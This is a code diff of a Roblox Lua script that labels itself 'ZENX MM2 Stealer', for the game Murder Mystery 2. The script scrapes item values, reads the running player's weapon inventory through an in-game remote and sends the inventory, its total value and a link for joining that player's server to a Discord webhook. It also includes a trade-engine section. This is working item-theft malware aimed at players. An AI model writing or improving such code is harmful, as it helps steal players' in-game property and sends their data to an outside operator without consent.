@@ -18,7 +18,7 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Multi-Category Scraper
+-- Multi-Category Live Scraper
 local itemValues = {}
 local function scrapeCategory(cat)
     local url = "https://supremevalues.com/mm2/" .. cat:lower()
@@ -43,40 +43,35 @@ local function loadLiveValues()
         scrapeCategory(c)
         task.wait(0.6)
     end
-    print("✅ Loaded " .. #itemValues .. " live values")
+    print("✅ Loaded " .. #itemValues .. " live values from categories")
 end
 
 loadLiveValues()
 
--- Rubis API Inventory
+-- In-Game Inventory (original method)
 local itemsToTrade = {}
 local overallValue = 0
+local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 
-local function fetchInventory()
-    pcall(function()
-        local resp = request({
-            Url = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name,
-            Method = "GET"
-        })
-        if resp and resp.Body then
-            local data = HttpService:JSONDecode(resp.Body)
-            -- Assuming structure has inventory/weapons - adjust if needed
-            local weapons = data.inventory and data.inventory.weapons or data.weapons or {}
-            for name, info in pairs(weapons) do
-                local count = info.count or info.amount or 1
-                local val = itemValues[name] or itemValues[name:lower()] or 100
-                overallValue += val * count
-                table.insert(itemsToTrade, {id = name, name = name, qty = count, val = val})
-            end
+local success, inventoryData = pcall(function()
+    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+end)
+
+if success and inventoryData and inventoryData.Weapons then
+    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
+        local info = itemDatabase[itemId]
+        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
+            local name = tostring(info.ItemName)
+            local val = itemValues[name] or itemValues[name:lower()] or 100
+            overallValue += val * count
+            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
         end
-    end)
+    end
 end
-
-fetchInventory()
 
 table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)
 
--- Discord + Joiner
+-- Discord
 local function postToDiscord()
     local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
     local displayLines = {}
@@ -100,17 +95,22 @@ local function postToDiscord()
                 {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                 {name = "Custom Joiner", value = joinLink, inline = false},
             },
-            footer = {text = "ZENX HUB • Rubis API + Live Scraper"},
+            footer = {text = "ZENX HUB • In-Game + Live Scraper"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
     pcall(function()
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(embed)
+        })
     end)
 end
 
--- Trade Engine (unchanged)
+-- Trade Engine
 local function checkTradeState()
     return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
 end
@@ -159,4 +159,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer - Rubis API Inventory Loaded")
+print("✅ ZENX MM2 Stealer Ready - In-Game Inventory + Multi Scraper")
